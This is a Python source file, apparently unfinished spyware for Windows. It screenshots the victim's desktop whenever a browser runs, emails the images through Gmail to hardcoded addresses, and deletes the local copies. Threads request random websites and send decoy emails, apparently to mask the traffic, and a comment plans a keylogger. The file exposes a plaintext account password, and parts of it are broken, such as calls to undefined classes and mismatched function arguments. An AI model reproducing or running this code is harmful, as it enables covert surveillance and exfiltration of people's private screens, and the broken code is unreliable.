import base64
from time import sleep
import win32api
import win32con
import win32gui
import win32ui
# from threading import Timer
from datetime import datetime
import random
import smtplib
import imghdr
from email.message import EmailMessage
#dobuwać keyloogera
import subprocess
import os
from list_of_website import websites
import requests
from threading import Thread


time_interval_screen = 5 # random.randint(10, 30)
time_interval_noise_mail = random.randint(15,20)
time_web_noise = random.randint(10, 15)
smpt_server = 'smtp.gmail.com'
smtp_port = 465
smtp_acct = 'becyp2137@gmail.com'
smtp_password = 'SlavaUkrainie69'
tgt_accts = ['becyp2137@gmail.com', 'becyp69@op.pl'] # ta lista może być zmienna
now = datetime.now() # current date and time

# getting the size of screen, a victim can have multiple monito
# ther is sth wrong 
def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)
   

def screenshot( name = 'screenshot'):
    # making handle for desktop
    hdesktop = win32gui.GetDesktopWindow() 
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    # saveing screenshot as a bitmap
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    name += '.bmp'
    screenshot.SaveBitmapFile(mem_dc, name)

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def screenshot_email(subject):
    mailobj = smtplib.SMTP('smtp.gmail.com',587)
    mailobj.ehlo()
    mailobj.starttls()
    mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = smtp_acct
    msg['To'] = tgt_accts[0] # This might be change for biggger address
    msg.set_content(subject)

    screenshot()

    with open('screenshot.bmp', 'rb') as f:
        file_data = f.read()
        file_type = imghdr.what(f.name)
        file_name = f.name
    if os.path.isfile('screenshot.bmp'):
        os.remove('screenshot.bmp')

    msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
    mailobj.send_message(msg)
    print("dupa")
    sleep(time_interval_screen)
    mailobj.quit()

def process_exists(process_name = "chrome.exe"):
    call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
    # use buildin check_output right away
    output = subprocess.check_output(call).decode()
    # check in last line for process name
    last_line = output.strip().split('\r\n')[-1]
    # because Fail message could be translated
    return last_line.lower().startswith(process_name.lower())

# add noise generator for example, nmap genreator, change mail names for diffrent
# allso send more emails for more random address 

def noise():
    web_addr = websites[random.randint(0,1000)]
    print(requests.get(web_addr))

def plain_email():
    mailobj = smtplib.SMTP('smtp.gmail.com',587)
    mailobj.ehlo()
    mailobj.starttls()
    mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
    msg = f"Subject: {websites[random.randint(0,1000)]} \n\n {websites[random.randint(0,1000)]}"
    print(msg)
    mailobj.sendmail(smtp_acct, smtp_acct, msg)
    mailobj.quit()

if __name__ == '__main__':
    
    """
    t = threading.Thread(target=screenshot)
    t.start()
    """
   
    """
    now = datetime.now() # current date and time
    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
    if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
        screenshot_email(date_time, date_time)
        print(f"message send: {now}")
    sleep(time_interval_screen)
    """





from threading import Thread
import time
class Screenshot(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            now = datetime.now() # current date and time
            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
            if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
                screenshot_email(date_time)
                print(f"message send: {now}")
            time.sleep(time_interval_screen)

class Noise(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            noise()
            time.sleep(time_web_noise)

class Plainmail(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            now = datetime.now() # current date and time
            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
            if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
                screenshot_email(date_time, date_time)
                print(f"message send: {now}")
            time.sleep(time_interval_screen)


myClassA()
myClassB()
while True:
    pass
